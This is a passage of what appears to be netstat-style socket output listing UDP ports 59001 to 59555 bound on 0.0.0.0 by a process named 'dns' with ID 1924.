  UDP        0.0.0.0               59001         *:*                            1924              dns
  UDP        0.0.0.0               59002         *:*                            1924              dns
  UDP        0.0.0.0               59003         *:*                            1924              dns
  UDP        0.0.0.0               59004         *:*                            1924              dns
  UDP        0.0.0.0               59005         *:*                            1924              dns
  UDP        0.0.0.0               59006         *:*                            1924              dns
  UDP        0.0.0.0               59007         *:*                            1924              dns
  UDP        0.0.0.0               59008         *:*                            1924              dns
  UDP        0.0.0.0               59009         *:*                            1924              dns
  UDP        0.0.0.0               59010         *:*                            1924              dns
  UDP        0.0.0.0               59011         *:*                            1924              dns
  UDP        0.0.0.0               59012         *:*                            1924              dns
  UDP        0.0.0.0               59013         *:*                            1924              dns
  UDP        0.0.0.0               59014         *:*                            1924              dns
  UDP        0.0.0.0               59015         *:*                            1924              dns
  UDP        0.0.0.0               59016         *:*                            1924              dns
  UDP        0.0.0.0               59017         *:*                            1924              dns
  UDP        0.0.0.0               59018         *:*                            1924              dns
  UDP        0.0.0.0               59019         *:*                            1924              dns
  UDP        0.0.0.0               59020         *:*                            1924              dns
  UDP        0.0.0.0               59021         *:*                            1924              dns
  UDP        0.0.0.0               59022         *:*                            1924              dns
  UDP        0.0.0.0               59023         *:*                            1924              dns
  UDP        0.0.0.0               59024         *:*                            1924              dns
  UDP        0.0.0.0               59025         *:*                            1924              dns
  UDP        0.0.0.0               59026         *:*                            1924              dns
  UDP        0.0.0.0               59027         *:*                            1924              dns
  UDP        0.0.0.0               59028         *:*                            1924              dns
  UDP        0.0.0.0               59029         *:*                            1924              dns
  UDP        0.0.0.0               59030         *:*                            1924              dns
  UDP        0.0.0.0               59031         *:*                            1924              dns
  UDP        0.0.0.0               59032         *:*                            1924              dns
  UDP        0.0.0.0               59033         *:*                            1924              dns
  UDP        0.0.0.0               59034         *:*                            1924              dns
  UDP        0.0.0.0               59035         *:*                            1924              dns
  UDP        0.0.0.0               59036         *:*                            1924              dns
  UDP        0.0.0.0               59037         *:*                            1924              dns
  UDP        0.0.0.0               59038         *:*                            1924              dns
  UDP        0.0.0.0               59039         *:*                            1924              dns
  UDP        0.0.0.0               59040         *:*                            1924              dns
  UDP        0.0.0.0               59041         *:*                            1924              dns
  UDP        0.0.0.0               59042         *:*                            1924              dns
  UDP        0.0.0.0               59043         *:*                            1924              dns
  UDP        0.0.0.0               59044         *:*                            1924              dns
  UDP        0.0.0.0               59045         *:*                            1924              dns
  UDP        0.0.0.0               59046         *:*                            1924              dns
  UDP        0.0.0.0               59047         *:*                            1924              dns
  UDP        0.0.0.0               59048         *:*                            1924              dns
  UDP        0.0.0.0               59049         *:*                            1924              dns
  UDP        0.0.0.0               59050         *:*                            1924              dns
  UDP        0.0.0.0               59051         *:*                            1924              dns
  UDP        0.0.0.0               59052         *:*                            1924              dns
  UDP        0.0.0.0               59053         *:*                            1924              dns
  UDP        0.0.0.0               59054         *:*                            1924              dns
  UDP        0.0.0.0               59055         *:*                            1924              dns
  UDP        0.0.0.0               59056         *:*                            1924              dns
  UDP        0.0.0.0               59057         *:*                            1924              dns
  UDP        0.0.0.0               59058         *:*                            1924              dns
  UDP        0.0.0.0               59059         *:*                            1924              dns
  UDP        0.0.0.0               59060         *:*                            1924              dns
  UDP        0.0.0.0               59061         *:*                            1924              dns
  UDP        0.0.0.0               59062         *:*                            1924              dns
  UDP        0.0.0.0               59063         *:*                            1924              dns
  UDP        0.0.0.0               59064         *:*                            1924              dns
  UDP        0.0.0.0               59065         *:*                            1924              dns
  UDP        0.0.0.0               59066         *:*                            1924              dns
  UDP        0.0.0.0               59067         *:*                            1924              dns
  UDP        0.0.0.0               59068         *:*                            1924              dns
  UDP        0.0.0.0               59069         *:*                            1924              dns
  UDP        0.0.0.0               59070         *:*                            1924              dns
  UDP        0.0.0.0               59071         *:*                            1924              dns
  UDP        0.0.0.0               59072         *:*                            1924              dns
  UDP        0.0.0.0               59073         *:*                            1924              dns
  UDP        0.0.0.0               59074         *:*                            1924              dns
  UDP        0.0.0.0               59075         *:*                            1924              dns
  UDP        0.0.0.0               59076         *:*                            1924              dns
  UDP        0.0.0.0               59077         *:*                            1924              dns
  UDP        0.0.0.0               59078         *:*                            1924              dns
  UDP        0.0.0.0               59079         *:*                            1924              dns
  UDP        0.0.0.0               59080         *:*                            1924              dns
  UDP        0.0.0.0               59081         *:*                            1924              dns
  UDP        0.0.0.0               59082         *:*                            1924              dns
  UDP        0.0.0.0               59083         *:*                            1924              dns
  UDP        0.0.0.0               59084         *:*                            1924              dns
  UDP        0.0.0.0               59085         *:*                            1924              dns
  UDP        0.0.0.0               59086         *:*                            1924              dns
  UDP        0.0.0.0               59087         *:*                            1924              dns
  UDP        0.0.0.0               59088         *:*                            1924              dns
  UDP        0.0.0.0               59089         *:*                            1924              dns
  UDP        0.0.0.0               59090         *:*                            1924              dns
  UDP        0.0.0.0               59091         *:*                            1924              dns
  UDP        0.0.0.0               59092         *:*                            1924              dns
  UDP        0.0.0.0               59093         *:*                            1924              dns
  UDP        0.0.0.0               59094         *:*                            1924              dns
  UDP        0.0.0.0               59095         *:*                            1924              dns
  UDP        0.0.0.0               59096         *:*                            1924              dns
  UDP        0.0.0.0               59097         *:*                            1924              dns
  UDP        0.0.0.0               59098         *:*                            1924              dns
  UDP        0.0.0.0               59099         *:*                            1924              dns
  UDP        0.0.0.0               59100         *:*                            1924              dns
  UDP        0.0.0.0               59101         *:*                            1924              dns
  UDP        0.0.0.0               59102         *:*                            1924              dns
  UDP        0.0.0.0               59103         *:*                            1924              dns
  UDP        0.0.0.0               59104         *:*                            1924              dns
  UDP        0.0.0.0               59105         *:*                            1924              dns
  UDP        0.0.0.0               59106         *:*                            1924              dns
  UDP        0.0.0.0               59107         *:*                            1924              dns
  UDP        0.0.0.0               59108         *:*                            1924              dns
  UDP        0.0.0.0               59109         *:*                            1924              dns
  UDP        0.0.0.0               59110         *:*                            1924              dns
  UDP        0.0.0.0               59111         *:*                            1924              dns
  UDP        0.0.0.0               59112         *:*                            1924              dns
  UDP        0.0.0.0               59113         *:*                            1924              dns
  UDP        0.0.0.0               59114         *:*                            1924              dns
  UDP        0.0.0.0               59115         *:*                            1924              dns
  UDP        0.0.0.0               59116         *:*                            1924              dns
  UDP        0.0.0.0               59117         *:*                            1924              dns
  UDP        0.0.0.0               59118         *:*                            1924              dns
  UDP        0.0.0.0               59119         *:*                            1924              dns
  UDP        0.0.0.0               59120         *:*                            1924              dns
  UDP        0.0.0.0               59121         *:*                            1924              dns
  UDP        0.0.0.0               59122         *:*                            1924              dns
  UDP        0.0.0.0               59123         *:*                            1924              dns
  UDP        0.0.0.0               59124         *:*                            1924              dns
  UDP        0.0.0.0               59125         *:*                            1924              dns
  UDP        0.0.0.0               59126         *:*                            1924              dns
  UDP        0.0.0.0               59127         *:*                            1924              dns
  UDP        0.0.0.0               59128         *:*                            1924              dns
  UDP        0.0.0.0               59129         *:*                            1924              dns
  UDP        0.0.0.0               59130         *:*                            1924              dns
  UDP        0.0.0.0               59131         *:*                            1924              dns
  UDP        0.0.0.0               59132         *:*                            1924              dns
  UDP        0.0.0.0               59133         *:*                            1924              dns
  UDP        0.0.0.0               59134         *:*                            1924              dns
  UDP        0.0.0.0               59135         *:*                            1924              dns
  UDP        0.0.0.0               59136         *:*                            1924              dns
  UDP        0.0.0.0               59137         *:*                            1924              dns
  UDP        0.0.0.0               59138         *:*                            1924              dns
  UDP        0.0.0.0               59139         *:*                            1924              dns
  UDP        0.0.0.0               59140         *:*                            1924              dns
  UDP        0.0.0.0               59141         *:*                            1924              dns
  UDP        0.0.0.0               59142         *:*                            1924              dns
  UDP        0.0.0.0               59143         *:*                            1924              dns
  UDP        0.0.0.0               59144         *:*                            1924              dns
  UDP        0.0.0.0               59145         *:*                            1924              dns
  UDP        0.0.0.0               59146         *:*                            1924              dns
  UDP        0.0.0.0               59147         *:*                            1924              dns
  UDP        0.0.0.0               59148         *:*                            1924              dns
  UDP        0.0.0.0               59149         *:*                            1924              dns
  UDP        0.0.0.0               59150         *:*                            1924              dns
  UDP        0.0.0.0               59151         *:*                            1924              dns
  UDP        0.0.0.0               59152         *:*                            1924              dns
  UDP        0.0.0.0               59153         *:*                            1924              dns
  UDP        0.0.0.0               59154         *:*                            1924              dns
  UDP        0.0.0.0               59155         *:*                            1924              dns
  UDP        0.0.0.0               59156         *:*                            1924              dns
  UDP        0.0.0.0               59157         *:*                            1924              dns
  UDP        0.0.0.0               59158         *:*                            1924              dns
  UDP        0.0.0.0               59159         *:*                            1924              dns
  UDP        0.0.0.0               59160         *:*                            1924              dns
  UDP        0.0.0.0               59161         *:*                            1924              dns
  UDP        0.0.0.0               59162         *:*                            1924              dns
  UDP        0.0.0.0               59163         *:*                            1924              dns
  UDP        0.0.0.0               59164         *:*                            1924              dns
  UDP        0.0.0.0               59165         *:*                            1924              dns
  UDP        0.0.0.0               59166         *:*                            1924              dns
  UDP        0.0.0.0               59167         *:*                            1924              dns
  UDP        0.0.0.0               59168         *:*                            1924              dns
  UDP        0.0.0.0               59169         *:*                            1924              dns
  UDP        0.0.0.0               59170         *:*                            1924              dns
  UDP        0.0.0.0               59171         *:*                            1924              dns
  UDP        0.0.0.0               59172         *:*                            1924              dns
  UDP        0.0.0.0               59173         *:*                            1924              dns
  UDP        0.0.0.0               59174         *:*                            1924              dns
  UDP        0.0.0.0               59175         *:*                            1924              dns
  UDP        0.0.0.0               59176         *:*                            1924              dns
  UDP        0.0.0.0               59177         *:*                            1924              dns
  UDP        0.0.0.0               59178         *:*                            1924              dns
  UDP        0.0.0.0               59179         *:*                            1924              dns
  UDP        0.0.0.0               59180         *:*                            1924              dns
  UDP        0.0.0.0               59181         *:*                            1924              dns
  UDP        0.0.0.0               59182         *:*                            1924              dns
  UDP        0.0.0.0               59183         *:*                            1924              dns
  UDP        0.0.0.0               59184         *:*                            1924              dns
  UDP        0.0.0.0               59185         *:*                            1924              dns
  UDP        0.0.0.0               59186         *:*                            1924              dns
  UDP        0.0.0.0               59187         *:*                            1924              dns
  UDP        0.0.0.0               59188         *:*                            1924              dns
  UDP        0.0.0.0               59189         *:*                            1924              dns
  UDP        0.0.0.0               59190         *:*                            1924              dns
  UDP        0.0.0.0               59191         *:*                            1924              dns
  UDP        0.0.0.0               59192         *:*                            1924              dns
  UDP        0.0.0.0               59193         *:*                            1924              dns
  UDP        0.0.0.0               59194         *:*                            1924              dns
  UDP        0.0.0.0               59195         *:*                            1924              dns
  UDP        0.0.0.0               59196         *:*                            1924              dns
  UDP        0.0.0.0               59197         *:*                            1924              dns
  UDP        0.0.0.0               59198         *:*                            1924              dns
  UDP        0.0.0.0               59199         *:*                            1924              dns
  UDP        0.0.0.0               59200         *:*                            1924              dns
  UDP        0.0.0.0               59201         *:*                            1924              dns
  UDP        0.0.0.0               59202         *:*                            1924              dns
  UDP        0.0.0.0               59203         *:*                            1924              dns
  UDP        0.0.0.0               59204         *:*                            1924              dns
  UDP        0.0.0.0               59205         *:*                            1924              dns
  UDP        0.0.0.0               59206         *:*                            1924              dns
  UDP        0.0.0.0               59207         *:*                            1924              dns
  UDP        0.0.0.0               59208         *:*                            1924              dns
  UDP        0.0.0.0               59209         *:*                            1924              dns
  UDP        0.0.0.0               59210         *:*                            1924              dns
  UDP        0.0.0.0               59211         *:*                            1924              dns
  UDP        0.0.0.0               59212         *:*                            1924              dns
  UDP        0.0.0.0               59213         *:*                            1924              dns
  UDP        0.0.0.0               59214         *:*                            1924              dns
  UDP        0.0.0.0               59215         *:*                            1924              dns
  UDP        0.0.0.0               59216         *:*                            1924              dns
  UDP        0.0.0.0               59217         *:*                            1924              dns
  UDP        0.0.0.0               59218         *:*                            1924              dns
  UDP        0.0.0.0               59219         *:*                            1924              dns
  UDP        0.0.0.0               59220         *:*                            1924              dns
  UDP        0.0.0.0               59221         *:*                            1924              dns
  UDP        0.0.0.0               59222         *:*                            1924              dns
  UDP        0.0.0.0               59223         *:*                            1924              dns
  UDP        0.0.0.0               59224         *:*                            1924              dns
  UDP        0.0.0.0               59225         *:*                            1924              dns
  UDP        0.0.0.0               59226         *:*                            1924              dns
  UDP        0.0.0.0               59227         *:*                            1924              dns
  UDP        0.0.0.0               59228         *:*                            1924              dns
  UDP        0.0.0.0               59229         *:*                            1924              dns
  UDP        0.0.0.0               59230         *:*                            1924              dns
  UDP        0.0.0.0               59231         *:*                            1924              dns
  UDP        0.0.0.0               59232         *:*                            1924              dns
  UDP        0.0.0.0               59233         *:*                            1924              dns
  UDP        0.0.0.0               59234         *:*                            1924              dns
  UDP        0.0.0.0               59235         *:*                            1924              dns
  UDP        0.0.0.0               59236         *:*                            1924              dns
  UDP        0.0.0.0               59237         *:*                            1924              dns
  UDP        0.0.0.0               59238         *:*                            1924              dns
  UDP        0.0.0.0               59239         *:*                            1924              dns
  UDP        0.0.0.0               59240         *:*                            1924              dns
  UDP        0.0.0.0               59241         *:*                            1924              dns
  UDP        0.0.0.0               59242         *:*                            1924              dns
  UDP        0.0.0.0               59243         *:*                            1924              dns
  UDP        0.0.0.0               59244         *:*                            1924              dns
  UDP        0.0.0.0               59245         *:*                            1924              dns
  UDP        0.0.0.0               59246         *:*                            1924              dns
  UDP        0.0.0.0               59247         *:*                            1924              dns
  UDP        0.0.0.0               59248         *:*                            1924              dns
  UDP        0.0.0.0               59249         *:*                            1924              dns
  UDP        0.0.0.0               59250         *:*                            1924              dns
  UDP        0.0.0.0               59251         *:*                            1924              dns
  UDP        0.0.0.0               59252         *:*                            1924              dns
  UDP        0.0.0.0               59253         *:*                            1924              dns
  UDP        0.0.0.0               59254         *:*                            1924              dns
  UDP        0.0.0.0               59255         *:*                            1924              dns
  UDP        0.0.0.0               59256         *:*                            1924              dns
  UDP        0.0.0.0               59257         *:*                            1924              dns
  UDP        0.0.0.0               59258         *:*                            1924              dns
  UDP        0.0.0.0               59259         *:*                            1924              dns
  UDP        0.0.0.0               59260         *:*                            1924              dns
  UDP        0.0.0.0               59261         *:*                            1924              dns
  UDP        0.0.0.0               59262         *:*                            1924              dns
  UDP        0.0.0.0               59263         *:*                            1924              dns
  UDP        0.0.0.0               59264         *:*                            1924              dns
  UDP        0.0.0.0               59265         *:*                            1924              dns
  UDP        0.0.0.0               59266         *:*                            1924              dns
  UDP        0.0.0.0               59267         *:*                            1924              dns
  UDP        0.0.0.0               59268         *:*                            1924              dns
  UDP        0.0.0.0               59269         *:*                            1924              dns
  UDP        0.0.0.0               59270         *:*                            1924              dns
  UDP        0.0.0.0               59271         *:*                            1924              dns
  UDP        0.0.0.0               59272         *:*                            1924              dns
  UDP        0.0.0.0               59273         *:*                            1924              dns
  UDP        0.0.0.0               59274         *:*                            1924              dns
  UDP        0.0.0.0               59275         *:*                            1924              dns
  UDP        0.0.0.0               59276         *:*                            1924              dns
  UDP        0.0.0.0               59277         *:*                            1924              dns
  UDP        0.0.0.0               59278         *:*                            1924              dns
  UDP        0.0.0.0               59279         *:*                            1924              dns
  UDP        0.0.0.0               59280         *:*                            1924              dns
  UDP        0.0.0.0               59281         *:*                            1924              dns
  UDP        0.0.0.0               59282         *:*                            1924              dns
  UDP        0.0.0.0               59283         *:*                            1924              dns
  UDP        0.0.0.0               59284         *:*                            1924              dns
  UDP        0.0.0.0               59285         *:*                            1924              dns
  UDP        0.0.0.0               59286         *:*                            1924              dns
  UDP        0.0.0.0               59287         *:*                            1924              dns
  UDP        0.0.0.0               59288         *:*                            1924              dns
  UDP        0.0.0.0               59289         *:*                            1924              dns
  UDP        0.0.0.0               59290         *:*                            1924              dns
  UDP        0.0.0.0               59291         *:*                            1924              dns
  UDP        0.0.0.0               59292         *:*                            1924              dns
  UDP        0.0.0.0               59293         *:*                            1924              dns
  UDP        0.0.0.0               59294         *:*                            1924              dns
  UDP        0.0.0.0               59295         *:*                            1924              dns
  UDP        0.0.0.0               59296         *:*                            1924              dns
  UDP        0.0.0.0               59297         *:*                            1924              dns
  UDP        0.0.0.0               59298         *:*                            1924              dns
  UDP        0.0.0.0               59299         *:*                            1924              dns
  UDP        0.0.0.0               59300         *:*                            1924              dns
  UDP        0.0.0.0               59301         *:*                            1924              dns
  UDP        0.0.0.0               59302         *:*                            1924              dns
  UDP        0.0.0.0               59303         *:*                            1924              dns
  UDP        0.0.0.0               59304         *:*                            1924              dns
  UDP        0.0.0.0               59305         *:*                            1924              dns
  UDP        0.0.0.0               59306         *:*                            1924              dns
  UDP        0.0.0.0               59307         *:*                            1924              dns
  UDP        0.0.0.0               59308         *:*                            1924              dns
  UDP        0.0.0.0               59309         *:*                            1924              dns
  UDP        0.0.0.0               59310         *:*                            1924              dns
  UDP        0.0.0.0               59311         *:*                            1924              dns
  UDP        0.0.0.0               59312         *:*                            1924              dns
  UDP        0.0.0.0               59313         *:*                            1924              dns
  UDP        0.0.0.0               59314         *:*                            1924              dns
  UDP        0.0.0.0               59315         *:*                            1924              dns
  UDP        0.0.0.0               59316         *:*                            1924              dns
  UDP        0.0.0.0               59317         *:*                            1924              dns
  UDP        0.0.0.0               59318         *:*                            1924              dns
  UDP        0.0.0.0               59319         *:*                            1924              dns
  UDP        0.0.0.0               59320         *:*                            1924              dns
  UDP        0.0.0.0               59321         *:*                            1924              dns
  UDP        0.0.0.0               59322         *:*                            1924              dns
  UDP        0.0.0.0               59323         *:*                            1924              dns
  UDP        0.0.0.0               59324         *:*                            1924              dns
  UDP        0.0.0.0               59325         *:*                            1924              dns
  UDP        0.0.0.0               59326         *:*                            1924              dns
  UDP        0.0.0.0               59327         *:*                            1924              dns
  UDP        0.0.0.0               59328         *:*                            1924              dns
  UDP        0.0.0.0               59329         *:*                            1924              dns
  UDP        0.0.0.0               59330         *:*                            1924              dns
  UDP        0.0.0.0               59331         *:*                            1924              dns
  UDP        0.0.0.0               59332         *:*                            1924              dns
  UDP        0.0.0.0               59333         *:*                            1924              dns
  UDP        0.0.0.0               59334         *:*                            1924              dns
  UDP        0.0.0.0               59335         *:*                            1924              dns
  UDP        0.0.0.0               59336         *:*                            1924              dns
  UDP        0.0.0.0               59337         *:*                            1924              dns
  UDP        0.0.0.0               59338         *:*                            1924              dns
  UDP        0.0.0.0               59339         *:*                            1924              dns
  UDP        0.0.0.0               59340         *:*                            1924              dns
  UDP        0.0.0.0               59341         *:*                            1924              dns
  UDP        0.0.0.0               59342         *:*                            1924              dns
  UDP        0.0.0.0               59343         *:*                            1924              dns
  UDP        0.0.0.0               59344         *:*                            1924              dns
  UDP        0.0.0.0               59345         *:*                            1924              dns
  UDP        0.0.0.0               59346         *:*                            1924              dns
  UDP        0.0.0.0               59347         *:*                            1924              dns
  UDP        0.0.0.0               59348         *:*                            1924              dns
  UDP        0.0.0.0               59349         *:*                            1924              dns
  UDP        0.0.0.0               59350         *:*                            1924              dns
  UDP        0.0.0.0               59351         *:*                            1924              dns
  UDP        0.0.0.0               59352         *:*                            1924              dns
  UDP        0.0.0.0               59353         *:*                            1924              dns
  UDP        0.0.0.0               59354         *:*                            1924              dns
  UDP        0.0.0.0               59355         *:*                            1924              dns
  UDP        0.0.0.0               59356         *:*                            1924              dns
  UDP        0.0.0.0               59357         *:*                            1924              dns
  UDP        0.0.0.0               59358         *:*                            1924              dns
  UDP        0.0.0.0               59359         *:*                            1924              dns
  UDP        0.0.0.0               59360         *:*                            1924              dns
  UDP        0.0.0.0               59361         *:*                            1924              dns
  UDP        0.0.0.0               59362         *:*                            1924              dns
  UDP        0.0.0.0               59363         *:*                            1924              dns
  UDP        0.0.0.0               59364         *:*                            1924              dns
  UDP        0.0.0.0               59365         *:*                            1924              dns
  UDP        0.0.0.0               59366         *:*                            1924              dns
  UDP        0.0.0.0               59367         *:*                            1924              dns
  UDP        0.0.0.0               59368         *:*                            1924              dns
  UDP        0.0.0.0               59369         *:*                            1924              dns
  UDP        0.0.0.0               59370         *:*                            1924              dns
  UDP        0.0.0.0               59371         *:*                            1924              dns
  UDP        0.0.0.0               59372         *:*                            1924              dns
  UDP        0.0.0.0               59373         *:*                            1924              dns
  UDP        0.0.0.0               59374         *:*                            1924              dns
  UDP        0.0.0.0               59375         *:*                            1924              dns
  UDP        0.0.0.0               59376         *:*                            1924              dns
  UDP        0.0.0.0               59377         *:*                            1924              dns
  UDP        0.0.0.0               59378         *:*                            1924              dns
  UDP        0.0.0.0               59379         *:*                            1924              dns
  UDP        0.0.0.0               59380         *:*                            1924              dns
  UDP        0.0.0.0               59381         *:*                            1924              dns
  UDP        0.0.0.0               59382         *:*                            1924              dns
  UDP        0.0.0.0               59383         *:*                            1924              dns
  UDP        0.0.0.0               59384         *:*                            1924              dns
  UDP        0.0.0.0               59385         *:*                            1924              dns
  UDP        0.0.0.0               59386         *:*                            1924              dns
  UDP        0.0.0.0               59387         *:*                            1924              dns
  UDP        0.0.0.0               59388         *:*                            1924              dns
  UDP        0.0.0.0               59389         *:*                            1924              dns
  UDP        0.0.0.0               59390         *:*                            1924              dns
  UDP        0.0.0.0               59391         *:*                            1924              dns
  UDP        0.0.0.0               59392         *:*                            1924              dns
  UDP        0.0.0.0               59393         *:*                            1924              dns
  UDP        0.0.0.0               59394         *:*                            1924              dns
  UDP        0.0.0.0               59395         *:*                            1924              dns
  UDP        0.0.0.0               59396         *:*                            1924              dns
  UDP        0.0.0.0               59397         *:*                            1924              dns
  UDP        0.0.0.0               59398         *:*                            1924              dns
  UDP        0.0.0.0               59399         *:*                            1924              dns
  UDP        0.0.0.0               59400         *:*                            1924              dns
  UDP        0.0.0.0               59401         *:*                            1924              dns
  UDP        0.0.0.0               59402         *:*                            1924              dns
  UDP        0.0.0.0               59403         *:*                            1924              dns
  UDP        0.0.0.0               59404         *:*                            1924              dns
  UDP        0.0.0.0               59405         *:*                            1924              dns
  UDP        0.0.0.0               59406         *:*                            1924              dns
  UDP        0.0.0.0               59407         *:*                            1924              dns
  UDP        0.0.0.0               59408         *:*                            1924              dns
  UDP        0.0.0.0               59409         *:*                            1924              dns
  UDP        0.0.0.0               59410         *:*                            1924              dns
  UDP        0.0.0.0               59411         *:*                            1924              dns
  UDP        0.0.0.0               59412         *:*                            1924              dns
  UDP        0.0.0.0               59413         *:*                            1924              dns
  UDP        0.0.0.0               59414         *:*                            1924              dns
  UDP        0.0.0.0               59415         *:*                            1924              dns
  UDP        0.0.0.0               59416         *:*                            1924              dns
  UDP        0.0.0.0               59417         *:*                            1924              dns
  UDP        0.0.0.0               59418         *:*                            1924              dns
  UDP        0.0.0.0               59419         *:*                            1924              dns
  UDP        0.0.0.0               59420         *:*                            1924              dns
  UDP        0.0.0.0               59421         *:*                            1924              dns
  UDP        0.0.0.0               59422         *:*                            1924              dns
  UDP        0.0.0.0               59423         *:*                            1924              dns
  UDP        0.0.0.0               59424         *:*                            1924              dns
  UDP        0.0.0.0               59425         *:*                            1924              dns
  UDP        0.0.0.0               59426         *:*                            1924              dns
  UDP        0.0.0.0               59427         *:*                            1924              dns
  UDP        0.0.0.0               59428         *:*                            1924              dns
  UDP        0.0.0.0               59429         *:*                            1924              dns
  UDP        0.0.0.0               59430         *:*                            1924              dns
  UDP        0.0.0.0               59431         *:*                            1924              dns
  UDP        0.0.0.0               59432         *:*                            1924              dns
  UDP        0.0.0.0               59433         *:*                            1924              dns
  UDP        0.0.0.0               59434         *:*                            1924              dns
  UDP        0.0.0.0               59435         *:*                            1924              dns
  UDP        0.0.0.0               59436         *:*                            1924              dns
  UDP        0.0.0.0               59437         *:*                            1924              dns
  UDP        0.0.0.0               59438         *:*                            1924              dns
  UDP        0.0.0.0               59439         *:*                            1924              dns
  UDP        0.0.0.0               59440         *:*                            1924              dns
  UDP        0.0.0.0               59441         *:*                            1924              dns
  UDP        0.0.0.0               59442         *:*                            1924              dns
  UDP        0.0.0.0               59443         *:*                            1924              dns
  UDP        0.0.0.0               59444         *:*                            1924              dns
  UDP        0.0.0.0               59445         *:*                            1924              dns
  UDP        0.0.0.0               59446         *:*                            1924              dns
  UDP        0.0.0.0               59447         *:*                            1924              dns
  UDP        0.0.0.0               59448         *:*                            1924              dns
  UDP        0.0.0.0               59449         *:*                            1924              dns
  UDP        0.0.0.0               59450         *:*                            1924              dns
  UDP        0.0.0.0               59451         *:*                            1924              dns
  UDP        0.0.0.0               59452         *:*                            1924              dns
  UDP        0.0.0.0               59453         *:*                            1924              dns
  UDP        0.0.0.0               59454         *:*                            1924              dns
  UDP        0.0.0.0               59455         *:*                            1924              dns
  UDP        0.0.0.0               59456         *:*                            1924              dns
  UDP        0.0.0.0               59457         *:*                            1924              dns
  UDP        0.0.0.0               59458         *:*                            1924              dns
  UDP        0.0.0.0               59459         *:*                            1924              dns
  UDP        0.0.0.0               59460         *:*                            1924              dns
  UDP        0.0.0.0               59461         *:*                            1924              dns
  UDP        0.0.0.0               59462         *:*                            1924              dns
  UDP        0.0.0.0               59463         *:*                            1924              dns
  UDP        0.0.0.0               59464         *:*                            1924              dns
  UDP        0.0.0.0               59465         *:*                            1924              dns
  UDP        0.0.0.0               59466         *:*                            1924              dns
  UDP        0.0.0.0               59467         *:*                            1924              dns
  UDP        0.0.0.0               59468         *:*                            1924              dns
  UDP        0.0.0.0               59469         *:*                            1924              dns
  UDP        0.0.0.0               59470         *:*                            1924              dns
  UDP        0.0.0.0               59471         *:*                            1924              dns
  UDP        0.0.0.0               59472         *:*                            1924              dns
  UDP        0.0.0.0               59473         *:*                            1924              dns
  UDP        0.0.0.0               59474         *:*                            1924              dns
  UDP        0.0.0.0               59475         *:*                            1924              dns
  UDP        0.0.0.0               59476         *:*                            1924              dns
  UDP        0.0.0.0               59477         *:*                            1924              dns
  UDP        0.0.0.0               59478         *:*                            1924              dns
  UDP        0.0.0.0               59479         *:*                            1924              dns
  UDP        0.0.0.0               59480         *:*                            1924              dns
  UDP        0.0.0.0               59481         *:*                            1924              dns
  UDP        0.0.0.0               59482         *:*                            1924              dns
  UDP        0.0.0.0               59483         *:*                            1924              dns
  UDP        0.0.0.0               59484         *:*                            1924              dns
  UDP        0.0.0.0               59485         *:*                            1924              dns
  UDP        0.0.0.0               59486         *:*                            1924              dns
  UDP        0.0.0.0               59487         *:*                            1924              dns
  UDP        0.0.0.0               59488         *:*                            1924              dns
  UDP        0.0.0.0               59489         *:*                            1924              dns
  UDP        0.0.0.0               59490         *:*                            1924              dns
  UDP        0.0.0.0               59491         *:*                            1924              dns
  UDP        0.0.0.0               59492         *:*                            1924              dns
  UDP        0.0.0.0               59493         *:*                            1924              dns
  UDP        0.0.0.0               59494         *:*                            1924              dns
  UDP        0.0.0.0               59495         *:*                            1924              dns
  UDP        0.0.0.0               59496         *:*                            1924              dns
  UDP        0.0.0.0               59497         *:*                            1924              dns
  UDP        0.0.0.0               59498         *:*                            1924              dns
  UDP        0.0.0.0               59499         *:*                            1924              dns
  UDP        0.0.0.0               59500         *:*                            1924              dns
  UDP        0.0.0.0               59501         *:*                            1924              dns
  UDP        0.0.0.0               59502         *:*                            1924              dns
  UDP        0.0.0.0               59503         *:*                            1924              dns
  UDP        0.0.0.0               59504         *:*                            1924              dns
  UDP        0.0.0.0               59505         *:*                            1924              dns
  UDP        0.0.0.0               59506         *:*                            1924              dns
  UDP        0.0.0.0               59507         *:*                            1924              dns
  UDP        0.0.0.0               59508         *:*                            1924              dns
  UDP        0.0.0.0               59509         *:*                            1924              dns
  UDP        0.0.0.0               59510         *:*                            1924              dns
  UDP        0.0.0.0               59511         *:*                            1924              dns
  UDP        0.0.0.0               59512         *:*                            1924              dns
  UDP        0.0.0.0               59513         *:*                            1924              dns
  UDP        0.0.0.0               59514         *:*                            1924              dns
  UDP        0.0.0.0               59515         *:*                            1924              dns
  UDP        0.0.0.0               59516         *:*                            1924              dns
  UDP        0.0.0.0               59517         *:*                            1924              dns
  UDP        0.0.0.0               59518         *:*                            1924              dns
  UDP        0.0.0.0               59519         *:*                            1924              dns
  UDP        0.0.0.0               59520         *:*                            1924              dns
  UDP        0.0.0.0               59521         *:*                            1924              dns
  UDP        0.0.0.0               59522         *:*                            1924              dns
  UDP        0.0.0.0               59523         *:*                            1924              dns
  UDP        0.0.0.0               59524         *:*                            1924              dns
  UDP        0.0.0.0               59525         *:*                            1924              dns
  UDP        0.0.0.0               59526         *:*                            1924              dns
  UDP        0.0.0.0               59527         *:*                            1924              dns
  UDP        0.0.0.0               59528         *:*                            1924              dns
  UDP        0.0.0.0               59529         *:*                            1924              dns
  UDP        0.0.0.0               59530         *:*                            1924              dns
  UDP        0.0.0.0               59531         *:*                            1924              dns
  UDP        0.0.0.0               59532         *:*                            1924              dns
  UDP        0.0.0.0               59533         *:*                            1924              dns
  UDP        0.0.0.0               59534         *:*                            1924              dns
  UDP        0.0.0.0               59535         *:*                            1924              dns
  UDP        0.0.0.0               59536         *:*                            1924              dns
  UDP        0.0.0.0               59537         *:*                            1924              dns
  UDP        0.0.0.0               59538         *:*                            1924              dns
  UDP        0.0.0.0               59539         *:*                            1924              dns
  UDP        0.0.0.0               59540         *:*                            1924              dns
  UDP        0.0.0.0               59541         *:*                            1924              dns
  UDP        0.0.0.0               59542         *:*                            1924              dns
  UDP        0.0.0.0               59543         *:*                            1924              dns
  UDP        0.0.0.0               59544         *:*                            1924              dns
  UDP        0.0.0.0               59545         *:*                            1924              dns
  UDP        0.0.0.0               59546         *:*                            1924              dns
  UDP        0.0.0.0               59547         *:*                            1924              dns
  UDP        0.0.0.0               59548         *:*                            1924              dns
  UDP        0.0.0.0               59549         *:*                            1924              dns
  UDP        0.0.0.0               59550         *:*                            1924              dns
  UDP        0.0.0.0               59551         *:*                            1924              dns
  UDP        0.0.0.0               59552         *:*                            1924              dns
  UDP        0.0.0.0               59553         *:*                            1924              dns
  UDP        0.0.0.0               59554         *:*                            1924              dns
  UDP        0.0.0.0               59555         *:*                            1924              dns
